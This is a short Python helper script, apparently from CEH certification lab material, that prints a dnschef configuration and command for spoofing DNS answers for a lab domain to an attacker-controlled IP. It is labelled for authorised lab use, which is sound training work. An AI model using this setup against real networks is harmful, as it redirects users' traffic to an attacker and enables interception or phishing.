#!/usr/bin/env python3
# LAB-ONLY: DNS Cache Poisoning Helper
# CEH v13 Master Module 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for DNS spoofing using Ettercap or dnschef
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN_TO_SPOOF = "example-lab.com"
LAB_SPOOFED_IP = "192.168.100.1"  # Your attacker IP
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: DNS Cache Poisoning Helper")
    print("="*80)
    print("Create a dnschef.ini file:")
    print("[A]")
    print(f"{LAB_DOMAIN_TO_SPOOF}={LAB_SPOOFED_IP}")
    print()
    print("Then run dnschef:")
    print("dnschef --interface 0.0.0.0 --file dnschef.ini")
    print()

if __name__ == "__main__":
    main()
